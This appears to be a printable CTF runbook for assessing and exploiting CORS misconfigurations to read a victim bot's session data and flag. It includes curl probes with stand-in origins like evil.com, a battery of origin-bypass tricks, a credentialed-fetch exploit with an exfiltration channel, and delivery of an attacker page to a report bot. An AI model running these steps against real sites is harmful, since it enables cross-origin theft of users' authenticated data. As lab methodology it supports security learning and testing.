# Checklist and runbook — the printable CORS assessment

A condensed, sequential run — the full procedure as a checklist you
can work through linearly.

---

## Phase A — orientation

- [ ] the target has a session (a cookie or a Bearer)
- [ ] the target has an API returning session data
- [ ] the flag lives in a readable endpoint (not just a write)
- [ ] a bot/victim exists to read under (or it's a same-origin page)

## Phase B — the endpoint inventory

```bash
# the session-data endpoints
for ep in /api/me /api/flag /api/user /api/profile /api/token \
          /api/admin /api/account /api/balance /api/config; do
  code=$(curl -s -o /dev/null -w '%{http_code}' -b "$CJ" "$BASE$ep")
  [ "$code" != "404" ] && echo "$ep => $code"
done
# the flag-carrying endpoint confirmed
curl -s -b "$CJ" "$BASE/api/me" | grep -iE 'flag|FLAG|secret'
```

- [ ] the flag endpoint identified — the read target
- [ ] the endpoint's content-type noted — JSON vs HTML

## Phase C — the CORS measurement

```bash
# the central probe — ACAO + ACAC
curl -s -i -b "$CJ" "$BASE/api/me" -H 'Origin: https://evil.com' | \
  grep -iE 'access-control-(allow-origin|allow-credentials)'
```

- [ ] ACAO recorded — reflected/*/`null`/fixed/absent
- [ ] ACAC recorded — true/absent
- [ ] the cookie's SameSite recorded — does it ride

## Phase D — the check-shape battery (when not open)

```bash
TD=$(echo "$BASE" | sed -E 's#https?://([^/:]+).*#\1#')
for o in 'null' "https://${TD}.evil.com" "https://evil${TD}" \
         "https://evil-${TD}" "https://sub.${TD}" \
         "https://${TD}@evil.com" "https://evil.com?${TD}" \
         "https://${TD}%2eevil.com" "https://${TD}." \
         "http://${TD}" 'file://' 'data:text/html,'; do
  echo -n "$o => "
  curl -s -i -b "$CJ" "$BASE/api/me" -H "Origin: $o" | \
    grep -i 'access-control-allow-origin' || echo 'no ACAO'
done
```

- [ ] the check-shape named — reflect/null/prefix/suffix/subdomain/strict
- [ ] a bypass origin identified (or 'strict — closed' recorded)

## Phase E — the exploit build

- [ ] the page matches the measured shape — the Origin, the credentialed fetch
- [ ] the fetch uses `credentials:'include'`
- [ ] the read method matches the content-type — `.json()`/`.text()`
- [ ] the exfil channel matches the bot's reachability
- [ ] a `.catch` records the error

## Phase F — the delivery

- [ ] the bot endpoint found — /report, /visit, an admin-trigger
- [ ] the page's origin matches the CORS allowlist
- [ ] the bot's session confirmed — a flag cookie, logged-in
- [ ] the bot's reachability confirmed — external / airgapped / data:

```bash
curl -X POST "$BASE/report" -d 'url=https://attacker/page'
# or a data: URL for an airgapped/null-origin case
```

## Phase G — the readback

- [ ] the OOB listener up — `oob_listener serve`
- [ ] the exfil hit verified — the data in the hit log
- [ ] the data attributed — a unique session field proves the bot's read
- [ ] the flag extracted

## Phase H — the evidence

```bash
python3 tools/state.py <c> --hypothesis "cors: <shape> on /api/<ep>"
python3 tools/hooks.py post-probe <c> --verdict <v> --hypothesis-id <H> \
  --class web-cors --evidence-kind <class|impact> \
  --evidence '<what>' --response '<the bytes>'
python3 tools/hooks.py pre-flag --value 'FLAG{...}' \
  --source '<the hit>' --evidence '<the bytes>'
```

- [ ] the hypothesis recorded
- [ ] the verdict recorded — the response bytes quoted
- [ ] the flag gated through pre-flag
- [ ] the negatives recorded — every gate that held

## The falsifier — when to stop

```text
a `*` on the sensitive endpoint → public — not the vuln — stop
a non-credentialed read only    → limited — a different vector — stop
a strict allowlist + no bypass  → closed — pivot — stop
a dead CORS surface + no alternate → a different class — stop
```

## The pivot — what to try when CORS is closed

- [ ] a JSONP endpoint → a script-tag read
- [ ] a ws endpoint → a websocket read
- [ ] a postMessage broadcast → an iframe + listener
- [ ] an XSS surface → a same-origin read (skip CORS)
- [ ] an XS-leak → a side-channel measure
- [ ] a different bug class → reclassify via classify.py
